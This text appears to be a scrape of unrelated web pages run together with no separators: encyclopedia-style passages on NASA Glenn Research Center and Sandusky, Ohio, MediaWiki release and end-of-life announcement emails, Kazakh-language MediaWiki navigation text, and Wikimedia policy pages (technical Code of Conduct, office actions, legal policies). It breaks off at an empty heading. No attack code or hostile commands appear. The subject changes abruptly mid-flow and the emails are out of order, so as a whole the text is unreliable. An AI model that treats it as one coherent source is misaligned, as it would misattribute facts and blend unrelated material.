The facility was designated a National Historic Landmark in 1985. It has been the world's largest microgravity facility since the 2003 closing of the Japan Microgravity Centre.

DEVELOPMENTS

[edit]


AERONAUTICS SCIENCE AND TECHNOLOGY

[edit]

NASA Glenn does research and technology development on jet engines, producing designs that reduce energy consumption, pollution, and noise. The chevrons it developed for noise reduction appear on many commercial jet engines today, including those used on the Boeing 787 Dreamliner.[10]


SPACE SCIENCE AND TECHNOLOGY

[edit]

The Glenn Research Center, along with companies it has hired, are credited with the following:

 * The liquid hydrogen rocket engine, which Wernher von Braun called the critical technology that allowed the Apollo Moon landings.[11]
 * The Centaur upper-stage rocket[11]
 * The gridded ion thruster, a high-efficiency engine for spaceflight.[12] A Glenn-derived ion engine was used on the NASA probe Deep Space 1.
 * The Electrical Power System for Space Station Freedom. A slightly modified version is used on the International Space Station.
 * The Universal Stage Adapter for the planned Block 1B iteration of the Space Launch System (SLS).[13]


CONTRIBUTIONS

[edit]

NASA Glenn's core competencies are:[14]

 * Air-breathing propulsion
 * Communications technology and development
 * Space propulsion and cryogenic fluids management
 * Power, energy storage, and conversion
 * Materials and structures for extreme environments


EDUCATION

[edit]

The Glenn Research Center is home to the Lewis' Educational and Research Collaborative Internship Program (LERCIP).[15] It provides internships for high school and college students and high school teachers. The high school program is an eight-week internship for sophomores and juniors with interests in science, technology, engineering, math, or professional administration. The college level consists of a 10-week internship and is open to college students at all levels. Only residents of the Cleveland area are eligible for high school LERCIP, but college LERCIP is open to students nationwide. Interns work closely with their NASA mentors and are involved in the daily activities of the center. They are expected to be available to work 40 hours a week for the duration of the internship. The LERCIP Teacher program is a 10-week internship for educators in STEM fields.

The Dropping In Microgravity Environment is an annual contest held yearly by the center. Teams of high school students write proposals for experiments to be performed in the Drop Tower. The winners travel to the center, perform their experiments, and submit a research report to NASA.[16]


FUTURE

[edit]

After 2004, NASA had been shifting its focus towards space exploration as mandated by the Vision for Space Exploration. Because of this, it was perceived by some that regional NASA centers like Glenn, which focus on research and technology, were becoming more and more marginalized in terms of resources and relevance.[17] However, on May 13, 2006, it was announced that NASA Glenn Research Center had secured management of the Crew Exploration Vehicle's service module, which promised to generate billions of dollars and hundreds of jobs for the center. This work secured the center's future in the near term, and signalled a shift in priority for the center from aeronautical research to space exploration, aligning itself closer with NASA's new mission.

Another change of direction created uncertainty in 2010, however, when President Obama and Congress declared the end of the Vision for Space Exploration and sought to chart a new course[clarification needed] for human space flight and NASA. However, the 2015 budget for NASA made substantial increases to projects in which the Research Center participates, such as aeronautics research, planetary science and space technology, and some of that funding was expected to flow down to the center.[18]


NASA GLENN VISITOR CENTER

[edit]
The Apollo Command Module of the 1973 Skylab 3 mission being moved to the Great Lakes Science Center

The Visitor Center closed in September 2009 with many displays shifted to the Great Lakes Science Center, and new ones created there. This move was done to reduce the public relations budget and to provide easier access to the general public, especially the under-served community. It was hoped that putting the displays at the much more visited science center will bring the NASA Glenn facility more public exposure.[19] In fact, this proved true: compared to the 60,000 visitors per year at its former site, the Glenn Visitor Center enjoyed 330,000 visitors in the first year at the Great Lakes Science Center. The new display area at the science center is referred to as the Glenn Visitor Center.[20]

The NASA Glenn Research Center also offers public tours of its research facilities on the first Saturday of each month. Reservations must be made in advance.

Greetings-

...and hopefully one last round of apologies. It was pointed out that the _contents_ of the previous release emails were _also_ incorrect, as opposed to just the relevant versions of MediaWiki. The following is both the correct content (released security issues) and relevant MediaWiki versions.

With the security/maintenance release of MediaWiki 1.39.12/1.42.6/1.43.1, we would also like to provide this supplementary announcement of MediaWiki extensions and skins with now-public Phabricator tasks, security patches and backports [1]:

The Wikimedia Security Team recommends updating these extensions and/or skins to the current master branch or relevant, supported release branch [2] as soon as possible. Some of the referenced Phabricator tasks above _may_ still be private. Unfortunately, when security issues are reported, sometimes sensitive information is exposed and since Phabricator is historical, we cannot make these tasks public without exposing this sensitive information. If you have any additional questions or concerns regarding this update, please feel free to contact security@wikimedia.org or file a security task within Phabricator [3].

I would like to announce the release of MediaWiki 1.42.5!

Thia release primarily serves as a maintenance release for this branch.

It is to fix a vendor issue, as reported in T382783. The version of Parsoid included in the vendor folder did not match the version in the composer.json file in MediaWiki core.

Other maintenance bug fixes have also been backported, and will be included in point releases for other MediaWiki branches (1.39 and 1.43) in the next security and maintenance release due at the end of March 2025.

The tarballs have already been uploaded as of this email, and the git tags have been pushed.

Reports of bugs with PHP 8.0, 8.1, 8.2, 8.3 and 8.4 support are particularly welcome, and fixes will be back-ported when possible. Please see https://phabricator.wikimedia.org/tag/php_8.0_support/, https://phabricator.wikimedia.org/tag/php_8.1_support/, https://phabricator.wikimedia.org/tag/php_8.2_support/, https://phabricator.wikimedia.org/tag/php_8.3_support/ and https://phabricator.wikimedia.org/tag/php_8.4_support/ for the relevant work boards.

As a reminder, MediaWiki 1.35 became end of life (EOL) in December 2023, MediaWiki 1.40 became EOL in June 2024 and MediaWiki 1.41 became EOL in December 2024.

It is strongly recommended to upgrade to either 1.42, which will be supported until June 2025, or to 1.43 (the next LTS after 1.39), which will be supported until December 2027.

21 Dec 2024 21 Dec '24
10:46 a.m.

As per the MediaWiki version lifecycle[1], I would like to announce the formal end of life (EOL) of MediaWiki 1.41 as of Tuesday December 31, 2024.

1.41.5 is expected to be the last release for this branch.

This means that MediaWiki 1.41 will no longer receive maintenance or security backports. It is therefore strongly discouraged that you continue to use it.

It is recommended to upgrade either to MediaWiki 1.42, which will be supported until June 2025 or to the next LTS, 1.43 (due to be released soon), which will be supported until at least December 2027.

Thanks!

Sandusky (/sænˈdʌski/ san-DUSS-kee) is a city in Erie County, Ohio, United States, and its county seat.[4] Situated on the southern shore of Lake Erie, Sandusky is located roughly midway between Toledo (45 miles (72 km) west) and Cleveland (50 miles (80 km) east). At the 2020 census, the city had a population of 25,095,[5] and the Sandusky metropolitan area had 115,986 residents.[6]

Sandusky was established in the early 19th century and developed as a port city at the head of Sandusky Bay. It is home to Cedar Point, one of the most popular amusement parks in the world, as well as water parks including Cedar Point Shores, Castaway Bay, Great Wolf Lodge, and Kalahari. The headquarters of Cedar Fair Entertainment Company were located in the city until it merged with Six Flags, who retains some administrative offices in Sandusky.


ETYMOLOGY

[edit]

The accepted etymology is that the name "Sandusky" is derived from the Wyandot word saundustee, meaning "water"[7][8] or andusti, "cold water."[9] In his 1734 history of New France, Charlevoix transliterated the word as "Chinouski." Sandusky Bay, formed at the mouth of the Sandusky River, is identified as "Lac (Lake) Sandouské" on a 1718 map by Guillaume DeLisle.[10] The name "L.(Lac) Sandoski" appears on a 1733 map.[11] Sandusky Bay was also called Lac Ondaské, in another French transliteration of the Wyandot.[12]

The river and bay gave rise to a number of eponymous forts and settlements along their shores. These consisted of the short-lived English trading post Fort Sandusky north of the bay, the French Fort Sandoské that replaced it, the British Fort Sandusky on the south shore of the bay, the American Fort Sandusky (later Fort Stephenson) upriver at Lower Sandusky (now known as Fremont, Ohio), as well as the Wyandot Indian village of Upper Sandusky farther upriver.[12]

Another, less accepted etymologic version claims that the city's name goes back to a Polish–American trader and frontiersman named Anthony Sadowski, a neighbor of the Boone family and co-founder of Amity village. He was employed by the governor of then British Pennsylvania as a trader and interpreter, speaking several Indian languages, especially Iroquois. He moved to the Pennsylvania frontier in January 1712 and could easily have made it to Lake Erie by 1718 to establish a trading post. One genealogical line of his descendants is actually called "Sandusky."[citation needed]


HISTORY

[edit]
The view of city park in 1897


18TH CENTURY

[edit]

This area was a center of trading and fortifications since the 18th century: the English, French, and Americans had trading posts and forts built on both the north and south sides of Sandusky Bay.[12]


19TH CENTURY

[edit]

George Croghan was one of the more prominent men who operated in this area in the 18th century. A federal fur trade factory was established in 1808 but was lost at the beginning of the War of 1812.[13]

Development by European Americans of the city of Sandusky, starting in 1818, on the southeast shore of Sandusky Bay, followed settlement of the war of 1812. Part of the city quickly enveloped the site of an earlier small village named Portland (established about 1816). Sandusky was incorporated as a city in 1824.[14] Eventually the city of Sandusky encompassed most of the entire township that had been called Portland.[15] Some of the city was built on land formerly occupied by a Native American man named Ogontz, and therefore the city is said to have been built on "Ogontz' place".

Sandusky's rise in the 19th century was heavily influenced by its location at the head of Sandusky Bay. This made it a key point both for the movement of goods and for the movement of people. The mild climate caused by its proximity to Lake Erie also caused it to become the center of Ohio's wine industry. The presence of limestone was also important in its development. It was also a key location for ice harvesting in the 19th century.[16] Lumber transport, stone quarrying and, in the early 20th century, manufacturing, have all contributed to the city's economic development.

Prior to the abolition of slavery in the United States, Sandusky was a stop for refugee slaves on the Underground Railroad, as some would travel across Lake Erie to reach freedom in Canada. Although Ohio was a free state, they felt at risk from slavecatchers because of bonuses offered under the Fugitive Slave Act of 1850. As depicted in Harriet Beecher Stowe's novel Uncle Tom's Cabin (1855), many refugee slaves seeking to get to Canada made their way to Sandusky, where they boarded boats crossing Lake Erie to the port of Amherstburg in Ontario.

Sandusky's original plat was designed by surveyor Hector Kilbourne according to a modified grid plan, known today as the Kilbourne Plat. Kilbourne later became the first Worshipful Master of the first Sandusky Masonic Lodge, known as Science Lodge #50, still in operation on Wayne Street. His design featured a street grid with avenues cutting diagonally to create patterns reminiscent of the symbols of Freemasonry.

On September 17, 1835, Sandusky was the site of groundbreaking for the Mad River and Lake Erie Railroad, which brought change to the town. Industrial areas developed near the railroad and goods were transported through the port. The coal docks located west of downtown still use a portion of the original MR&LE right-of-way. In 1838, Erie County, Ohio was formed by the state legislature and Sandusky was designated the county seat. This led to the foundation of a court house and Sandusky becoming a regional government center.[17] In 1846 Sandusky had a population of approximately 3,000 people. At that point Sandusky had two railroads and was also a main focus of lake traffic. The town then consisted of many stores, two printing offices, two machine shops, two banks, six churches, one high school, and several iron furnaces.[18]

The English author Charles Dickens visited the city in 1842, and briefly wrote of it in his subsequent travelogue, American Notes. Said Dickens, who rode the newly constructed MR&LE railroad from Tiffin:

> At two o'clock we took the railroad; the travelling-on which was very slow, its construction being indifferent, and the ground wet and marshy; and arrived at Sandusky in time to dine that evening. We put up at a comfortable little hotel on the brink of Lake Erie, lay there that night, and had no choice but to wait there next day, until a steamboat bound for Buffalo appeared. The town, which was sluggish and uninteresting enough, was something like the back of an English watering-place out of the season.

By 1880, Sandusky had risen to a population of 16,000. There were then 20 churches and three newspapers in the community. The city boasted 29 businesses with at least 10 employees. Products being produced included lime, railroad locomotives and cars, carriages, wheels, crayons, chalk, beer, paper, baskets, and tools.[18] By 1886 Sandusky was the center of wood wheel manufacture in the United States. It was also the location of the Ohio State Fish hatchery and the Ohio Soldiers and Sailor's Home.[18]


20TH CENTURY

[edit]

The city developed as a center of paper-making. With a mill in the industrial area near the lake, the Hinde & Dauch Paper Company was the largest employer in the city in the early 1900s.

As the 20th century progressed, the economy of Sandusky came to focus mainly on tourism and fishing. Since the late 20th century, Battery Park Marina was developed on the original site of the MR&LE Railroad after restructuring of the industry reduced traffic on the line. The tracks that ran through downtown Sandusky have since been removed. Most of the downtown industrial area is also being redeveloped for other purposes, including mainly marina dockage.

The National Arbor Day Foundation has designated Sandusky as a Tree City USA.

LOCAL AREAS

[edit]

Historically, the Wyandot used the term andoske to refer to the river, the bay, and the general area where the city of "Sandusky" later developed. This practice was also used by French and English settlers in the area. Often in historical documents, the word "Sandusky" is used without clarification as to which specific site or location is being referred to. Historical references to "Sandusky" might mean any one of the following locations, depending also on the date of the reference.[26]

List of locations, with approximate dates of usage:

 * Sandusky/Sandusky City - about 1817* to present, village/city on southeast side of Sandusky Bay (*-any "Sandusky" reference dated prior to 1817 would not refer to this village, as it was not officially established by this name until 1818).
 * Sandusky Bay - 1700 to present; early variants were "(Lac d')Otsanderket", "(Lac d')Otsandoske", "Lake Sandoskė".
 * Sandusky River - 1740s to present.
 * Fort Sandusky - various locations: c. 1745, an English trading post on the northern side of the bay. c.1754, a French fort ("Fort Janundat") was built on the southern side of the bay. Later in the French and Indian War, the British built Fort Sandusky on the southeastern side of Sandusky Bay. From about 1812/1813, this referred to a fort (later called "Fort Stephenson") on the Sandusky River, near present-day Fremont, Ohio.
 * Lower Sandusky - 1760s to 1849, area or village at the site of what is now the city of Fremont.
 * Upper Sandusky - 1760s? to present, area or village at the falls, which later developed as the current city of Upper Sandusky. Upper Sandusky is south of Sandusky and upriver of it. While a common first impression is that "Upper" implies "north of", here "Upper" refers to "upstream", as in upstream of Lake Erie by means of the Sandusky River.
 * Upper Sandusky Old Town - 1760s? to ?, a historic Wyandot (Huron) tribe village, about 12 miles (19 km) north of where the city of Upper Sandusky developed.

CEDAR POINT

[edit]
Main article: Cedar Point
Cedar Point, the second-oldest operating amusement park in the U.S.

Cedar Point is a 364-acre (147 ha) amusement park located on a peninsula on Lake Erie. America's second-oldest theme park and popularly known as "America's Roller Coast", the park has the third-largest collection of roller coasters in the world at 17, behind only Energylandia and Six Flags Magic Mountain.[31][32]

Cedar Point is also the only park in the world to have six roller coasters with heights of over 200 feet (61 m). Numerous Cedar Point roller coasters have set world records, the most notable of these being Magnum XL-200, Millennium Force, and Top Thrill Dragster each having set the record for the tallest full-circuit roller coaster at their respective openings.[33] GateKeeper opened in 2013 with the highest inversion (from ground level) of any roller coaster. As of 2024, the ride has the fifth-highest inversion.[34] Steel Vengeance opened in 2018 as the tallest, fastest, and longest hybrid roller coaster, and the first "hyper-hybrid" roller coaster.[35] As of 2024, the ride remains the longest hybrid roller coaster, but is tied for the second fastest and is the third tallest, surpassed by Zadra and Iron Gwazi.


WATERPARKS

[edit]

Cedar Fair operates two water parks in Sandusky: Cedar Point Shores, an outdoor park adjacent to Cedar Point that opened in 1988, and Castaway Bay, an indoor park and resort opened in 2004.

Another indoor water park, Great Wolf Lodge, opened in Sandusky in 2001 and features restaurants, arcades, spas, and other children's activities.[36] Kalahari Resorts opened an African safari-themed indoor water park in 2005 that was the largest of its kind at one time.[37] Its hotel is the largest in the state of Ohio.[38] The resort also features an 215,000-square-foot (20,000 m2) convention center.


ISLANDS

[edit]

May through August every year, Sandusky residents and incoming tourists flock to the neighboring islands north of the city, with many transportation options leaving right from downtown. The islands include Kelleys Island, South Bass Island (host of the popular village known as Put-in-Bay), Middle Bass Island and North Bass Island.

Themed parties are a common occurrence in the summer season throughout Sandusky and on the neighboring islands, such as "Island Fest", "Rock on the Dock", and "Christmas in July"; thousands of residents and tourists join in the festivities annually.

In 2008, the residents of Sandusky hosted their first annual "Barge Party", where boats from as far as Toledo and Cleveland came to dock up their boats together at the sandbar, just inside Sandusky Bay.[39] The barge party ensues twice every year, typically in late June and late July.[39]


MUSEUMS

[edit]

Sandusky is home to several museums and historic homes. These include the Cooke-Dorn House historic site which was the home of Eleutheros Cooke, the Follett House Museum which was the home of Oran Follett, the Maritime Museum of Sandusky, the Merry-Go Round Museum, and the Ohio Veterans Home Museum.[40]

TV

[edit]

The Vacationland region–which encompasses Sandusky–has one locally targeted television station, religiously oriented WGGN-TV channel 52. Sandusky's location between Toledo and Cleveland means that the city is also served by stations (albeit at a fringe level) in both of those markets as well.

 * MediaWiki мүдделі тараптары пайдаланушы тобына қосылыңыз

 * Оқу, өңдеу және жеке күйге келтіру туралы көбірек біліңіз


КОД ЖАСАҢЫЗ ДА, КЕҢЕЙТІҢІЗ

 * MediaWiki-дің әзірлеуші құжаттамасын оқыңыз
 * Wikimedia әзірлеушілер алаңына өтіңіз


КӨМЕК АЛЫП, ҮЛЕС ҚОСЫҢЫЗ

 * MediaWiki ақауына жауап таба алмадыңыз ба? Қолдау үстелінде сұраңыз!
 * Аудармашы, дизайнер, құжаттама жазушы, сынақшы, технология амбассадоры немесе әзірлеуші ретінде қатысыңыз
 * Бағдарламаның қате жұмыс істеуін хабарлап, соған жаңа функция ұсыныңыз

This page has been moved to "Policy:Office actions" on Wikimedia Foundation Governance Wiki where you can provide translations and feedback on it.

----------------------------------------

Any translations should be provided at its location on Wikimedia Foundation Governance Wiki and any related feedback provided on its talk page there. Thank you!


HISTORICAL BACKGROUND

The office actions policy was originally launched on en.wp by Jimmy Wales, back in February 2006, and shortly afterwards on meta, in order to solidify long standing practices and processes followed by the Foundation, that were not officially recorded elsewhere in the projects at that time. Its original scope focused on page protections and BLP article content changes, in response to increasingly rising number of escalated calls for action, placed directly to the Foundation’s staff, by affected individuals. Danny Wool was the first designated Foundation staff member mandated to accept, review and act on such requests, after Jimmy Wales.

The office actions policy has undergone several iterations since, on both sites, and has been expanded to include a variety of office actions that have been taken over the years as common practice, broadening its original scope. At the same time, strict internal processes have been developed by the Foundation in order to complement as well as standardise office actions and staff use of advanced rights.

Office actions were originally intended to be temporary actions, alleviating pressures caused by controversial situations and calling community attention to them in the hopes of resolution. However, certain office actions have since evolved to be permanent and non-appealable due to the nature of the issues they deal with, while others have become defunct (Superprotect).

Code of Conduct for
Wikimedia Technical Spaces Principles Report a problem Handling cases Committee (members ) Amendments FAQ v · d · e

This page documents a community policy for Wikimedia technical spaces.

This is a code of conduct for Wikimedia technical spaces. It applies both within physical spaces, such as Wikimedia technical events and Wikimedia technical presentations in other events, and virtual spaces (MediaWiki.org, wikitech.wikimedia.org, Phabricator , Gerrit Code Review, technical mailing lists, technical IRC channels, Etherpad , and other development-oriented spaces operated by the Wikimedia Foundation).


PRINCIPLES

In the interest of fostering an open and welcoming community, we are committed to making participation in Wikimedia technical projects a respectful and harassment-free experience for everyone, regardless of gender, gender identity and expression, sex, sexual orientation, disability, neuroatypicality, physical appearance, body size, race, ethnicity, national origin, age, political affiliation, or religion.

Technical skills and community status make no difference to the right to be respected and the obligation to respect others. Newcomers and other contributors with limited experience in our community deserve a welcoming attitude and constructive feedback. Prolific contributions and technical expertise are not a justification for lower standards of behaviour.


UNACCEPTABLE BEHAVIOUR

Harassment and other types of inappropriate behaviour are unacceptable in all public and private Wikimedia technical spaces. Examples include but are not limited to:

 * Personal attacks, violence, threats of violence, threats of legal action, or deliberate intimidation.
 * Offensive, derogatory, or discriminatory comments.
 * Gratuitous or off-topic use of sexual language or imagery.
 * Inappropriate or unwanted attention, touching, or physical contact (sexual or otherwise).
 * Inappropriate or unwanted public or private communication, following, or any form of stalking.
 * Unwanted photography or recording.
 * Disclosure of a person's identity or other private information without their consent. Disclosure of some identifying information is not consent to disclose other identifying information.
 * Inappropriate or unwanted publication of private communication. Publishing or reporting private communication or personally identifying information for the purposes of reporting harassment (as explained here) and/or in the case of whistleblowing, is acceptable.
 * Harming the discussion or community with methods such as sustained disruption, interruption, or blocking of community collaboration (i.e. trolling).
 * Discrimination, particularly against marginalised and otherwise underrepresented groups. Targeted outreach to such groups is allowed and encouraged.
 * Using the code of conduct system for purposes other than reporting genuine violations of the code of conduct (e.g., retaliating against a reporter or victim by filing a report claiming their response was harassment).
 * Attempting to circumvent a decision of the Committee, e.g. unblocking someone during a period the Committee banned them.


REPORT A PROBLEM

In case of threats of harm and other urgent situations, notify the relevant authorities first (if possible) and email the Wikimedia Foundation via emergencywikimedia.org (more information).

People who experience or observe unacceptable behaviour are encouraged to follow any of these steps:

 1. Ask the person who is behaving unacceptably to stop. Make them aware of this Code of Conduct.
 2. If you are at an event, report the problem to the event organisers, or a designated contact.
 3. Report the problem directly to the Code of Conduct Committee via techconductwikimedia.org. You can also send a report to the Committee if you reported an incident elsewhere but were not satisfied with the response.

Reports can be as short as a notification with a link, but more information will help us understand what is happening. You can include:

 * Your contact information (e.g. Wikimedia and Phabricator usernames), if you want to identify yourself.
 * Your account of the incident:
   * Where and when it happened.
   * A description of the unacceptable behaviour.
   * Who was involved and who saw it happen.
   * Whether the incident is ongoing.
 * Any additional information that will help us fully understand the problem, such as previous incidents or special circumstances.
 * Links to public records of the incident, if any.
 * Screenshots showing what exactly happened.

Reports are processed confidentially. For more information, see Confidentiality.

Go to Code of Conduct/Cases to learn about how reports to the Committee are processed.


ATTRIBUTION AND RE-USE

This Code of Conduct is adapted from the Contributor Covenant (revision 49054013), the jQuery Code of Conduct (revision 91777886), the Open Code of Conduct (v1.0), and the Citizen Code of Conduct, along with the WMF Friendly space policy.

WIKIMEDIA FOUNDATION LEGAL POLICIES


FREQUENTLY ASKED QUESTIONS

For whom are these policies? These policies are for the Office of the General Counsel at the Wikimedia Foundation, but we understand that many of the addressed issues may be of interest to the Community. For that reason, we are sharing these policies with the Community. Is this the final version? Yes and No. These policies are now in final form. That said, we expect the policy to represent a living document that we will amend, correct, and update as we address a variety of legal issues over time. Some good ideas in the discussion page will require further reflection and may be included in the policy at a later date. Why are you writing these policies now? We have developed a number of internal practices. We feel it is now appropriate to write those practices down to ensure institutional knowledge and to serve as a foundation upon which we can develop our best practices. What kind of topics are addressed in the policies? There is a wide range of topics that are addressed in the policies, including: applicable law, responsibility for edits, DMCA takedowns, trade secrets, child pornography, fair use, harassment, subpoenas, and trademark licensing. Are these policies binding? No. Since they are only staff policies, the Office of the General Counsel reserves that right to deviate from the policies depending on the circumstances, including legal developments. The policies do not constitute a contract or other type of commitment by the Wikimedia Foundation.


INTRODUCTION

These policies are established by and for the Office of the General Counsel to assist in ensuring consistency in addressing internal and external issues that relate to specific legal questions. This is intended as a living document and will be updated as needed based on the experiences and needs of the Office.

If you have any questions about the implementation of these policies, please contact the Office of the General Counsel.

Rev. Date: Feb 9, 2012

Notice: This document does not constitute legal advice. It is merely intended to document certain procedures and processes relevant to the Office of the General Counsel. These policies are subject to change without notice and should not be considered a binding agreement or contract. Any exception made to these policies should does not constitute binding precedent for future decisions.


APPLICABLE LAW DETERMINATION

United States law is applicable to Wikimedia Projects. The Wikimedia Foundation is a U.S.-formed corporation, and, for that reason, Wikimedia complies with U.S. law.

As a general rule, both the laws of Florida (where the Wikimedia Foundation was incorporated) and the laws of California (where its headquarters is located) should be examined when determining questions of legal compliance. Other state laws may apply, but that assessment requires a case-by-case legal determination by the Office of the General Counsel.

Internationally, other countries' laws could be relevant, but that determination also requires a case-by-case legal analysis.

Update 15 October 2021 on applicable non-US law

As of 2021, the Office of the General Counsel would like to provide an update on the Foundation’s approach to international law and how we anticipate working with the communities to respond to international legal demands and court orders.

Since this policy was last updated in 2012, many countries around the world have passed laws exerting both explicitly and implicitly that they have jurisdiction over internet companies that do not have physical presence in their country. Simultaneously, the Foundation and the Wikimedia movement have grown significantly more international with a much greater investment of resources outside the United States than was true in 2012. As a result, the Office of General Counsel may need to comply with court orders coming from non-US countries in some cases. We hope to do so in cooperation with the volunteer communities and transparently to the greatest extent allowed by the law.

As noted in the 2012 policy, the determination of international law remains a case by case determination. However, there is a greater likelihood as of 2021 that international law will be found to apply. In making this applicable law determination, the Office of the General Counsel considers the following factors:

 1. The case must be one where it is clear that the Foundation cannot effectively challenge the law. The inability to challenge the law includes both the primary law at issue in the case and the ability to challenge geographic jurisdiction. The Office of General Counsel will make this determination either as the result of a court order or through legal advice from expert local counsel.
 2. The case must be one that presents a risk to the Foundation or the movement. Examples of risks include but are not limited to: risks to editor safety, risks of project blocking or similar technical disruption, and/or monetary risks.
 3. A human rights analysis finds that compliance with the law is in line with international human rights norms. Examples: a case that found that an individual person’s right to dignity and privacy outweighed the public interest in certain information would likely align with human rights norms. On the other hand, a case that ordered the removal of public information about a major historical event would likely not align with human rights norms.

Please note that all three of the above factors must be met for the Foundation to make this determination of applicable law. For example, if there is content that violates human rights or poses a significant threat to users but has no associated litigation, the Foundation would endeavor to address the problem through other measures such as cooperation with the communities or separate Trust & Safety processes. Similarly, if there is a losing case, but it poses no risk to the Foundation or the movement, this likely indicates that the law at issue is not applicable to the Foundation.

In situations where non-US law is applicable, the Foundation is committed to working with local volunteer communities to the extent possible. In particular, if the relevant documents are public, we will share them on-wiki (or on the Foundation corporate website if copyright does not permit sharing on-wiki). If the relevant documents are confidential, we will share a public summary if possible and will share confidentially with local users under a non-disclosure agreement if no other method is possible. We are planning to begin a log on-wiki which will be linked here to document legal demands shared with the communities in this manner.

If local communities would like to create a particular process for complying with applicable non-US legal demands, we ask that you document this process on-wiki and send a note to legalwikimediaorg so that we can document the process for that language. We recommend that a local process include the possibility of oversighting article history (this may be required where certain private or defamatory information should not be publicly available even in old versions of an article) and have a way to indicate that changes were made for legal reasons to alert future users who may try to add back in deleted content. In addition, as court orders sometimes come with short deadlines, we recommend that a local process be able to review and make changes within seven (7) days of receipt. Please be reassured that no volunteers are required to act in response to any given issue: these are our suggestions for how such a process could work in situations where the community wishes to engage in such review. In addition, we remind community members that in the extremely unlikely case that they were to become part of a lawsuit as a result of their work on such a case, they would likely qualify for assistance under our legal fees assistance program.

The Office of General Counsel commits to working through local language or project community processes to the greatest extent possible. If an applicable legal order requires changes to on-wiki content, we will only make direct changes via office action if there is a legal deadline and local process is unavailable or unable to respond in line with the legal requirement in time. In the event that we make a change via office action, we will provide an update to the local community after the change explaining the reason.


COMMUNITY ADVICE

As a general rule, the Office of the General Counsel should advise that editors who do not comply with their local laws do so at their own risk. See Responsibility for Edits in the long-standing public legal policies.

The Foundation's mission is to “empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally.” Although the Wikimedia Foundation does not encourage violation of any laws, we should view any legal restriction on content that prevents this mission with healthy skepticism.

In its discretion, the volunteer community has, at times, made reference to certain laws as being relevant to their Projects as a matter of policy. See, e.g., http://commons.wikimedia.org/wiki/Licensing#Country-specific_laws (“Generally, the policy applied on Commons is to only allow images that can be used in all (or at least most) countries.”)(“The safest way to apply international copyright law is to consider the laws of all the relevant jurisdictions and then use the most restrictive combination of laws to determine whether something is copyrighted or not.”).

Rules on choice of law that are established as a matter of policy by the editorial community of a particular Project generally should be respected by volunteers working on that project. Such rules however may lead to adoption of more restrictive policies than are required by international law principles. In short, these rules represent important editorial decisions on how to manage a Project but may not reflect the state of the law as applied in courts. The Office of the General Counsel therefore retains the discretion, as needed, to take a different approach in its defense of the Wikimedia Foundation.

In all cases, Projects should follow at least United States law as a minimum restrictive requirement. If the Community adopts less restrictive policies that fail to comply with United States law, the Wikimedia Foundation should advocate change to those policies to comply with United States law. In short, no policy may supersede the restrictions of United States law.[1]

Example: The Italian Wikipedia includes a policy that purports to apply only Italian law (without regard to U.S. law) on issues of trademark. If the Italian law is more protective of trademarks than U.S. law, the Wikimedia Foundation will not intervene. However, if a relevant aspect of Italian law is less protective of trademarks than U.S. law, the Wikimedia Foundation may request that the policy be rendered compliant with U.S. law.


RESPONSIBILITY FOR EDITS AND CONTRIBUTIONS

An editor is legally responsible for his or her edits and contributions on Wikimedia Projects. The Projects are only hosting venues: the Wikimedia Foundation generally does not edit, contribute to, or monitor the content on the site. For that reason, the Wikimedia Foundation is not responsible for the edits or contributions of the editors.[2] See 47 U.S.C. 230

Editors should be advised to exercise caution and avoid contributing any content that may result in criminal or civil liability, including infringing material, defamatory statements, and privacy violations.

The Wikimedia Foundation strongly supports free speech throughout the world. The Wikimedia Foundation accordingly does not agree with many countries' restrictive laws on content. That said, local courts may try to impose local norms. For that reason, the Wikimedia Foundation should advise editors and administrators who do not comply with their local laws that they do so at their own risk.

Example: An editor lives in Iran, where the local laws are more restrictive of political content than U.S. laws. Any edits on political content by the editor are at his or her own risk, even though the Foundation may disagree with the underlying laws.


DEFENSE OF CONTRIBUTORS

The work of our editors, photographers, and other contributors is extremely appreciated by the Wikimedia Foundation and the community, and fortunately the vast majority of contributions occur without incident, legal or otherwise. On rare occasion, a party may threaten litigation or actually file suit. Often lawsuits are without merit but must still be defended; contributions to a Project that appear to be constructive and within Project policy may still place the contributor at legal risk.

As a general rule, editors, photographers, and other contributors are responsible for their own edits and contributions, and, for that reason, as a general matter, they are responsible for their own defense where a legal action related to their edits or contributions may arise. Contributors should be aware that litigation is a possibility, and they should avoid placing themselves in situations beyond their individual tolerance for risk.

The Wikimedia Foundation does not routinely offer financial support to editors, photographers, or other contributors who find themselves in litigation. In certain unusual cases, the Foundation, in its discretion, may consider helping to find financing to pay for a legal defense or to assist in locating pro bono counsel when a contributor has been named as a defendant in a legal action. Such an undertaking may be possible in cases that raise significant issues relating to free speech and that advance the mission "to empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally." WMF would give consideration, for example, to requests involving issues that:

 * Raise significant freedom of expression questions that affect the Project's ability to be a neutral source of information, such as true and verifiable statements that are censored under local law (e.g., foreign laws that prohibit truthful information unfavorable to the government);
 * Would expand significantly the breadth of content that would fall under the public domain (e.g., art in public domain); or
 * Would reinforce the enforceability of the Creative Commons and similar free-content licenses (e.g., that Creative Commons license is valid).

To be eligible for any financial or other support, the contributor must have acted in compliance with the WMF Terms of Use, applicable privacy policies, and applicable community and Foundation policies. At its sole discretion, WMF will make the final determination of eligibility and may consider any other relevant facts or circumstances.

If you are a contributor facing serious legal threats or action, you should act quickly in retaining a lawyer to protect all your rights. If you think your case fits the criteria listed above, please feel free to contact legalwikimedia.org. If you are a user with special user rights (such as Checkuser) who is facing a legal threat due to an action taken within the line of your duties, there may be another program available to help. Contact legalwikimedia.org for more information.

Caveats: For legal ethical reasons, WMF cannot create an attorney-client or other confidential relationship with contributors, and if any financial or other support were provided it would not establish such a relationship. No one should rely on the possibility of financial or other support or take any action with the expectation of receiving such support. If there were any financial support, it would not include payment of any fines or damages. If any financial or other support were provided it would not create any agency, employee, contractor, or other legal relationship with WMF. If WMF provided any support, WMF would not necessarily be endorsing any activity undertaken by a contributor before or after receipt of support. WMF may change this policy at any time, for any reason, without notice. Any financial support, if given, would be subject to budget constraints.

In cases where the Wikimedia Foundation cannot offer or find financial or other support, editors, photographers, and other contributors may wish to consult legal agencies that provide legal defense at no or reduced cost.

In appropriate cases, the Wikimedia Foundation may support a contributor in non-financial ways, such as public statements of support.

Importantly, the Wikimedia Foundation does not advise the Community to ignore laws that are under challenge.

Example: The Wikimedia Foundation has decided to challenge a copyright law in Spain that affects whether certain art falls into the public domain. Users who are subject to Spanish law should continue to comply with that law while it remains legally valid. This is so even if the Wikimedia Foundation itself is challenging the law.


OFFICE ACTIONS

